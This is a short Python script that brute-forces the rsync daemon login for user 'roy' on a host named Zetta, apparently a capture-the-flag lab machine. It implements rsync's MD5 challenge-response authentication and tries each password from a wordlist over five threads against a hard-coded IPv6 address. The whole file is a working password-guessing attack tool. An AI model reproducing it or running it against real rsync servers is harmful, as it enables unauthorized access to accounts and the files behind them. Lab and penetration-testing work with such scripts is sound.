# This script tries to Brute-Force the login against the rsync service on Zetta
# It requires a wordlist.txt in the directory where it is executed from

import concurrent.futures
from time import sleep
from random import randint
from base64 import b64encode, b64decode
from socket import *
import hashlib

def generate_hash(password, challenge):
    password = password.encode()
    challenge = challenge.encode()
    m = hashlib.new('md5')
    m.update(password)
    m.update(challenge)
    md5_hash = b64encode(m.digest())
    md5_hash = md5_hash.decode()
    md5_hash = (md5_hash.replace('=','')).strip()
    return md5_hash

def login(password):
    # CHANGE IPv6 ADDRESS
    ipv6_address = 'dead:beef::250:56ff:feb9:159c'
    password = password.strip()
    addrinfo = getaddrinfo(ipv6_address, 8730, AF_INET6, SOCK_STREAM)
    (family, socktype, proto, canonname, sockaddr) = (addrinfo[0])
    s = socket(family, socktype, proto)
    s.connect(sockaddr)
    s.recv(4096)
    s.send("@RSYNCD: 31.0\n".encode())
    s.recv(4096)
    s.send("home_roy\n".encode())
    output = s.recv(4096)
    challenge = output.split(' '.encode())[2].strip().decode()
    response = generate_hash(password, challenge)
    s.send(f"roy {response}\n".encode())
    output = s.recv(4096)
    if '@RSYNCD: OK'.encode() in output:
            print(password)
    return False

with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
    job = {executor.submit(login, password): password for password in open('wordlist.txt').readlines()}
    for future in concurrent.futures.as_completed(job):
        None
